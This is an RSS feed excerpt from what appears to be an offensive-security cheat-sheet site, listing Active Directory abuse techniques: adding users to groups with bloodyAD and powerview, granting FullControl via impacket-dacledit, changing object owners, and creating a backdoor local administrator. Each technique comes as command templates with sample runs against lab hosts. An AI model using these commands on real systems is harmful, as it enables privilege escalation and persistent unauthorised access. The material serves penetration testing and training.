channel.title: AddMember on TLDRBins
channel.description: Recent content in AddMember on TLDRBins

item.title: AddMember
item.description: Privesc #1: Add User to Group (From Linux) bloodyAD powerview.py 1. Add User to Group # Password bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> --dc-ip <DC_IP> add groupMember '<GROUP>' '<TARGET_USER>' # Kerberos bloodyAD -d <DOMAIN> -u '<USER>' -k --host <DC> --dc-ip <DC_IP> add groupMember '<GROUP>' '<TARGET_USER>' Ref: bloodyAD 1. Connect # Password sudo ntpdate -s <DC_IP> && powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_DOMAIN>' $ sudo ntpdate -s dc01.rebound.htb && powerview 'rebound.htb/oorend:1GR8t@$$4u@dc01.rebound.htb' Logging directory is set to /home/kali/.

item.title: AddSelf
item.description: Privesc #1: Add Self to Group (From Linux) bloodyAD powerview.py 1. Add Self to Group # Password bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> --dc-ip <DC_IP> add groupMember '<GROUP>' '<USER>' $ bloodyAD -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 add groupMember SERVICEMGMT 'oorend' [+] oorend added to SERVICEMGMT # NTLM bloodyAD -d <DOMAIN> -u '<USER>' -p '<HASH>' -f rc4 -k --host <DC> --dc-ip <DC_IP> add groupMember '<GROUP>' '<USER>' # Kerberos bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> --dc-ip <DC_IP> add groupMember '<GROUP>' '<USER>' $ bloodyAD -d absolute.

item.title: GenericAll
item.description: Abuse #1: Change Target User Password Linux Windows 1. Add Full Control to Current User [Optional] impacket bloodyAD # Kerberos sudo ntpdate -s <DC_IP> && impacket-dacledit '<DOMAIN>/<USER>:<PASSWORD>' -k -dc-ip <DC> -principal <USER> -target-dn 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' -inheritance -action write -rights FullControl -use-ldaps $ sudo ntpdate -s 10.129.232.31 && impacket-dacledit 'REBOUND.HTB/oorend:1GR8t@$$4u' -k -dc-ip DC01.REBOUND.HTB -principal oorend -target-dn 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' -inheritance -action write -rights FullControl -use-ldaps Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies [-] CCache file is not found.

item.title: Persistence
item.description: Add Local User # Create new user net user '<USER>' '<PASSWORD>' /add PS C:\WINDOWS\system32> net user test Test1234!@ /add The command completed successfully. # Add user to admin group net localgroup Administrators '<USER>' /add PS C:\WINDOWS\system32> net localgroup administrators test /add The command completed successfully. # Add user to remote desktop group net localgroup "Remote Desktop Users" '<USER>' /add PS C:\WINDOWS\system32> net localgroup "remote desktop users" test /add The command completed successfully.

item.title: WriteOwner/Own
item.description: Abuse #1 : Change Owner of the Group/User Linux Windows 1. Powerview.py # Password powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_DOMAIN>' $ powerview 'CERTIFIED.HTB/judith.mader:judith09@DC01.CERTIFIED.HTB' ╭─LDAPS─[DC01.certified.htb]─[CERTIFIED\judith.mader]-[NS:<auto>] ╰─PV ❯ # NTLM powerview '<DOMAIN>/<USER>@<TARGET_DOMAIN>' -H '<HASH>' 2. Change Owner Set-DomainObjectOwner -TargetIdentity '<TARGET_IDENTITY>' -PrincipalIdentity '<TARGET_USER>' ╭─LDAPS─[DC01.certified.htb]─[CERTIFIED\judith.mader]-[NS:<auto>] ╰─PV ❯ Set-DomainObjectOwner -TargetIdentity 'Management' -PrincipalIdentity 'judith.mader' [2025-07-17 03:16:36] [Set-DomainObjectOwner] Changing current owner S-1-5-21-729746778-2675978091-3820388244-512 to S-1-5-21-729746778-2675978091-3820388244-1103 [2025-07-17 03:16:36] [Set-DomainObjectOwner] Success! modified owner for CN=Management,CN=Users,DC=certified,DC=htb 1. Import PowerView . .\PowerView.ps1 *Evil-WinRM* PS C:\Users\maria> . .
